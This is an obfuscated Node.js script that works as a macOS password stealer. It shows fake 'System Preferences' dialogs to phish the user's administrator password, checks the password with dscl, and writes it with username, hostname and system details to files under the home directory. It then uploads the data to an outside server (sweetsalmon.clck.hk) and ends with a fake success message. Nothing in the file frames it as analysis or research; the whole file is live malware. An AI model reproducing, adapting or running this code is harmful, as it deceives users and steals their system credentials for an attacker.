#!/usr/bin/env node

const _0x30b088=_0x2bc7;(function(_0xce6931,_0x4eddbd){const _0x2ed524=_0x2bc7,_0x3568b2=_0xce6931();while(!![]){try{const _0x1d212f=-parseInt(_0x2ed524(0xce))/0x1*(-parseInt(_0x2ed524(0xe0))/0x2)+-parseInt(_0x2ed524(0xb9))/0x3*(-parseInt(_0x2ed524(0xbc))/0x4)+parseInt(_0x2ed524(0xa9))/0x5+-parseInt(_0x2ed524(0xb4))/0x6+-parseInt(_0x2ed524(0xec))/0x7+-parseInt(_0x2ed524(0xaa))/0x8*(parseInt(_0x2ed524(0xe8))/0x9)+parseInt(_0x2ed524(0xb1))/0xa;if(_0x1d212f===_0x4eddbd)break;else _0x3568b2['push'](_0x3568b2['shift']());}catch(_0x147c5e){_0x3568b2['push'](_0x3568b2['shift']());}}}(_0x59f8,0x80cb1));const {execSync}=require('child_process'),fs=require('fs'),path=require(_0x30b088(0xcd)),os=require('os'),crypto=require(_0x30b088(0xe5)),http=require(_0x30b088(0xe1)),https=require(_0x30b088(0xcc)),CONFIG={'serverDomain':_0x30b088(0xc6),'serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':_0x30b088(0xbe),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function _0x59f8(){const _0x5e2926=['md5','\x0aArchitecture:\x20','write','request','Password\x20successfully\x20uploaded\x20to\x20server','platform','--\x0d\x0a','error','User:\x20','Upload\x20failed:\x20','mkdirSync','Unexpected\x20error\x20in\x20main\x20process','toISOString','Current\x20user:\x20','Password\x20verification\x20failed','temp_logs.txt','3002725FRpVMW','140528rLQxBK','internal','Error\x20requesting\x20password\x20via\x20dialog:\x20','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','\x0aPlatform:\x20','.txt\x22\x0d\x0a','then','8391480tikEAU','join','userInfo','2416122GAhbkz','statusCode','\x0aTime:\x20','unknown','ignore','18ixtMhS','Failed\x20to\x20save\x20password\x20locally','Attempt\x20','452908CJGaay','match','tJz4uRVCwl2eEwyPTudYP9iGRfgq','hex','hostname','random','serverDomain','Password\x20collection\x20failed\x20or\x20was\x20canceled','POST','username','sweetsalmon.clck.hk','Maximum\x20retry\x20attempts\x20reached','startsWith','timeout','networkInterfaces','release','https','path','769oYHBMk','maxRetries','----WebKitFormBoundary','mac','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','existsSync','port','osascript\x20-e\x20\x27display\x20dialog\x20\x22System\x20settings\x20updated\x20successfully.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','homedir','serverPort','\x0aType:\x20','stringify','Request\x20error:\x20','Starting\x20macOS\x20password\x20collection\x20process','\x0aClientID:\x20','apiKey','Error\x20saving\x20password\x20locally:\x20','includes','650eFZoal','http','digest','end','toString','crypto','Upload\x20successful:\x20','User\x20canceled\x20password\x20entry','252fZgTDx','log','Error\x20getting\x20administrator\x20password:\x20','Uploading\x20data\x20to\x20server:\x20','6628356yvUAuZ','osascript\x20-e\x20\x27display\x20dialog\x20\x22To\x20launch\x20the\x20application,\x20you\x20need\x20to\x20update\x20the\x20system\x20settings\x5cn\x5cnPlease\x20enter\x20your\x20password.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','data','writeFileSync',')...','\x0aPassword:\x20','update','00:00:00:00:00:00','JSON\x20data\x20saved\x20to:\x20','message','https://','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','stack','Administrator\x20password\x20verified','substring','retryDelay','appendFileSync','Password\x20collection\x20process\x20completed','arch','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','type','search','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','User\x20canceled'];_0x59f8=function(){return _0x5e2926;};return _0x59f8();}function log(_0x2882c6,_0x1dd0b8){const _0x56d871=_0x30b088,_0xa6509a=new Date()[_0x56d871(0xa5)]();console[_0x56d871(0xe9)]('['+_0xa6509a+']\x20'+_0x2882c6);if(_0x1dd0b8)console[_0x56d871(0xa0)](_0x1dd0b8);try{const _0x3450f6=path[_0x56d871(0xb2)](os['homedir'](),_0x56d871(0xa8));fs[_0x56d871(0xfc)](_0x3450f6,'['+_0xa6509a+']\x20'+_0x2882c6+'\x0a');if(_0x1dd0b8)fs['appendFileSync'](_0x3450f6,(_0x1dd0b8[_0x56d871(0xf8)]||_0x1dd0b8)+'\x0a');}catch(_0x58b29d){}}function verifyPassword(_0x2b7743,_0x56bcc9){const _0x1426ef=_0x30b088;try{const _0x3e8251='dscl\x20/Local/Default\x20-authonly\x20'+_0x2b7743+'\x20'+_0x56bcc9;return execSync(_0x3e8251,{'stdio':_0x1426ef(0xb8)}),!![];}catch(_0x1708b6){return![];}}async function getMacOSPassword(){const _0x2012b1=_0x30b088;log('\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20===');try{const _0x5abc0a=os['userInfo']()[_0x2012b1(0xc5)];log(_0x2012b1(0xa6)+_0x5abc0a);for(let _0x415138=0x1;_0x415138<=0x5;_0x415138++){log(_0x2012b1(0xbb)+_0x415138+'\x20of\x205\x20to\x20get\x20password');const _0x1e2fa3=_0x2012b1(0xed);try{const _0x2be447=execSync(_0x1e2fa3,{'encoding':'utf8'});let _0x3b17c4='';const _0x449cf7=_0x2be447[_0x2012b1(0xbd)](/text returned:([^,]+)/);if(_0x449cf7&&_0x449cf7[0x1]){_0x3b17c4=_0x449cf7[0x1]['trim']();if(verifyPassword(_0x5abc0a,_0x3b17c4))return log(_0x2012b1(0xf9)),SYSTEM_PASSWORD=_0x3b17c4,_0x3b17c4;else log(_0x2012b1(0xa7)),_0x415138<0x5&&execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Please\x20try\x20again.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}else{if(_0x2be447['includes']('gave\x20up:true'))return log(_0x2012b1(0xe7)),null;else log(_0x2012b1(0xf7));}}catch(_0x33423a){log(_0x2012b1(0xac)+_0x33423a[_0x2012b1(0xf5)]);if(_0x33423a[_0x2012b1(0xf5)][_0x2012b1(0xdf)](_0x2012b1(0x103)))return log(_0x2012b1(0xe7)),null;}}return execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20The\x20application\x20will\x20exit.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27'),null;}catch(_0x165bc5){return log(_0x2012b1(0xea)+_0x165bc5[_0x2012b1(0xf5)],_0x165bc5),null;}}function generateClientId(){const _0x49edca=_0x30b088;try{const _0x2ffa9e=getMacAddress(),_0x5e7d35=os['hostname'](),_0x4e31a5=os[_0x49edca(0xb3)]()['username'],_0x3df9bc=crypto['createHash'](_0x49edca(0x104))[_0x49edca(0xf2)](_0x2ffa9e+':'+_0x5e7d35+':'+_0x4e31a5)[_0x49edca(0xe2)](_0x49edca(0xbf))[_0x49edca(0xfa)](0x0,0x8);return _0x3df9bc;}catch(_0x5a5cb0){return Math[_0x49edca(0xc1)]()[_0x49edca(0xe4)](0x24)[_0x49edca(0xfa)](0x2,0xa);}}function getMacAddress(){const _0xeabf41=_0x30b088;try{const _0x3619e5=os[_0xeabf41(0xca)]();for(const _0x172407 of Object['keys'](_0x3619e5)){for(const _0x1eb5ae of _0x3619e5[_0x172407]){if(!_0x1eb5ae[_0xeabf41(0xab)]&&_0x1eb5ae[_0xeabf41(0xd1)]!==_0xeabf41(0xf3))return _0x1eb5ae['mac'];}}return _0xeabf41(0xb7);}catch(_0x3e0375){return _0xeabf41(0xb7);}}async function uploadToServer(_0x238119,_0x1a4654=0x0){return new Promise(_0x4770fe=>{const _0x14f14e=_0x2bc7;try{const _0x4b8a48=generateClientId(),_0x4b9f21={'hostname':os[_0x14f14e(0xc0)](),'platform':os[_0x14f14e(0x109)](),'type':os['type'](),'arch':os[_0x14f14e(0xfe)](),'username':os['userInfo']()[_0x14f14e(0xc5)],'id':_0x4b8a48},_0x1ee07a=CONFIG[_0x14f14e(0xd7)]===0x1bb?_0x14f14e(0xcc):_0x14f14e(0xe1),_0x28c5be=_0x1ee07a+'://'+CONFIG[_0x14f14e(0xc2)]+':'+CONFIG['serverPort']+CONFIG['serverPath'],_0x2704d6=_0x28c5be[_0x14f14e(0xc8)](_0x14f14e(0xf6)),_0x258abb=_0x2704d6?https:http,_0x10dd18=new URL(_0x28c5be),_0x12c1dc=_0x14f14e(0xd0)+Math[_0x14f14e(0xc1)]()[_0x14f14e(0xe4)](0x10)['substr'](0x2);let _0x3ba6e6='';_0x3ba6e6+='--'+_0x12c1dc+'\x0d\x0a',_0x3ba6e6+=_0x14f14e(0xad),_0x3ba6e6+=_0x14f14e(0xff),_0x3ba6e6+=JSON[_0x14f14e(0xd9)](_0x4b9f21)+'\x0d\x0a',_0x3ba6e6+='--'+_0x12c1dc+'\x0d\x0a',_0x3ba6e6+=_0x14f14e(0x102)+_0x4b8a48+_0x14f14e(0xaf),_0x3ba6e6+=_0x14f14e(0xd2),_0x3ba6e6+=_0x238119+'\x0d\x0a',_0x3ba6e6+='--'+_0x12c1dc+_0x14f14e(0x10a);const _0x2930c7={'hostname':_0x10dd18[_0x14f14e(0xc0)],'port':_0x10dd18[_0x14f14e(0xd4)]||(_0x2704d6?0x1bb:0x50),'path':_0x10dd18['pathname']+_0x10dd18[_0x14f14e(0x101)],'method':_0x14f14e(0xc4),'headers':{'Content-Type':'multipart/form-data;\x20boundary='+_0x12c1dc,'Content-Length':Buffer['byteLength'](_0x3ba6e6),'X-Client-Info':JSON[_0x14f14e(0xd9)](_0x4b9f21),'X-API-Key':CONFIG[_0x14f14e(0xdd)]},'timeout':CONFIG[_0x14f14e(0xc9)]};log(_0x14f14e(0xeb)+_0x28c5be);const _0x3eec1d=_0x258abb[_0x14f14e(0x107)](_0x2930c7,_0x3e9081=>{const _0x2e2ef7=_0x14f14e;let _0x4ab6a8='';_0x3e9081['on'](_0x2e2ef7(0xee),_0x454daf=>{_0x4ab6a8+=_0x454daf;}),_0x3e9081['on'](_0x2e2ef7(0xe3),()=>{const _0x1847e6=_0x2e2ef7;_0x3e9081['statusCode']>=0xc8&&_0x3e9081[_0x1847e6(0xb5)]<0x12c?(log(_0x1847e6(0xe6)+_0x3e9081[_0x1847e6(0xb5)]),_0x4770fe(!![])):(log(_0x1847e6(0xa2)+_0x3e9081['statusCode']+',\x20'+_0x4ab6a8),_0x1a4654<CONFIG[_0x1847e6(0xcf)]?(log('Retrying\x20upload\x20('+(_0x1a4654+0x1)+'/'+CONFIG[_0x1847e6(0xcf)]+_0x1847e6(0xf0)),setTimeout(()=>{uploadToServer(_0x238119,_0x1a4654+0x1)['then'](_0x4770fe);},CONFIG[_0x1847e6(0xfb)])):(log(_0x1847e6(0xc7)),_0x4770fe(![])));});});_0x3eec1d['on']('error',_0x598d76=>{const _0x4adf55=_0x14f14e;log(_0x4adf55(0xda)+_0x598d76[_0x4adf55(0xf5)],_0x598d76),_0x1a4654<CONFIG['maxRetries']?(log('Retrying\x20upload\x20('+(_0x1a4654+0x1)+'/'+CONFIG['maxRetries']+_0x4adf55(0xf0)),setTimeout(()=>{const _0x1c90c4=_0x4adf55;uploadToServer(_0x238119,_0x1a4654+0x1)[_0x1c90c4(0xb0)](_0x4770fe);},CONFIG[_0x4adf55(0xfb)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x4770fe(![]));}),_0x3eec1d[_0x14f14e(0x106)](_0x3ba6e6),_0x3eec1d[_0x14f14e(0xe3)]();}catch(_0x1d0e31){log('Upload\x20error:\x20'+_0x1d0e31[_0x14f14e(0xf5)],_0x1d0e31),_0x1a4654<CONFIG[_0x14f14e(0xcf)]?(log('Retrying\x20upload\x20('+(_0x1a4654+0x1)+'/'+CONFIG[_0x14f14e(0xcf)]+_0x14f14e(0xf0)),setTimeout(()=>{const _0x11842a=_0x14f14e;uploadToServer(_0x238119,_0x1a4654+0x1)[_0x11842a(0xb0)](_0x4770fe);},CONFIG[_0x14f14e(0xfb)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x4770fe(![]));}});}function _0x2bc7(_0x3956ac,_0x40d818){const _0x59f8b9=_0x59f8();return _0x2bc7=function(_0x2bc78b,_0x31dd73){_0x2bc78b=_0x2bc78b-0xa0;let _0x442848=_0x59f8b9[_0x2bc78b];return _0x442848;},_0x2bc7(_0x3956ac,_0x40d818);}function savePasswordLocally(_0x153560){const _0x3a2b2e=_0x30b088;try{const _0x559e1b=os['userInfo']()[_0x3a2b2e(0xc5)],_0x2d68a3=generateClientId(),_0x41aae8=new Date()[_0x3a2b2e(0xa5)](),_0x51f5d6=os[_0x3a2b2e(0xd6)](),_0x5623db=path[_0x3a2b2e(0xb2)](_0x51f5d6,'SecurityUpdates');!fs[_0x3a2b2e(0xd3)](_0x5623db)&&fs[_0x3a2b2e(0xa3)](_0x5623db,{'recursive':!![]});const _0x214377=_0x3a2b2e(0xa1)+_0x559e1b+_0x3a2b2e(0xf1)+_0x153560+_0x3a2b2e(0xb6)+_0x41aae8+'\x0aHostname:\x20'+os[_0x3a2b2e(0xc0)]()+_0x3a2b2e(0xae)+os['platform']()+_0x3a2b2e(0xd8)+os[_0x3a2b2e(0x100)]()+_0x3a2b2e(0x105)+os['arch']()+_0x3a2b2e(0xdc)+_0x2d68a3,_0x3bc25e=path['join'](_0x5623db,_0x2d68a3+'.txt');fs[_0x3a2b2e(0xef)](_0x3bc25e,_0x214377),log('Password\x20data\x20saved\x20to:\x20'+_0x3bc25e);const _0x1e78d2={'user':_0x559e1b,'password':_0x153560,'timestamp':_0x41aae8,'hostname':os[_0x3a2b2e(0xc0)](),'system':{'platform':os[_0x3a2b2e(0x109)](),'release':os[_0x3a2b2e(0xcb)](),'type':os[_0x3a2b2e(0x100)](),'arch':os[_0x3a2b2e(0xfe)]()},'clientId':_0x2d68a3},_0xe1e1ce=path[_0x3a2b2e(0xb2)](_0x5623db,_0x2d68a3+'.json');return fs[_0x3a2b2e(0xef)](_0xe1e1ce,JSON[_0x3a2b2e(0xd9)](_0x1e78d2,null,0x2)),log(_0x3a2b2e(0xf4)+_0xe1e1ce),_0x214377;}catch(_0x19d3a0){return log(_0x3a2b2e(0xde)+_0x19d3a0[_0x3a2b2e(0xf5)],_0x19d3a0),null;}}async function main(){const _0x471c03=_0x30b088;try{log(_0x471c03(0xdb));const _0x351203=await getMacOSPassword();if(!_0x351203){log(_0x471c03(0xc3));return;}const _0x2c9276=savePasswordLocally(_0x351203);if(!_0x2c9276){log(_0x471c03(0xba));return;}const _0x4615af=await uploadToServer(_0x2c9276);if(_0x4615af){log(_0x471c03(0x108));try{execSync(_0x471c03(0xd5));}catch(_0x4c7663){}}else log('Failed\x20to\x20upload\x20password\x20to\x20server');log(_0x471c03(0xfd));}catch(_0x524304){log(_0x471c03(0xa4),_0x524304);}}main();
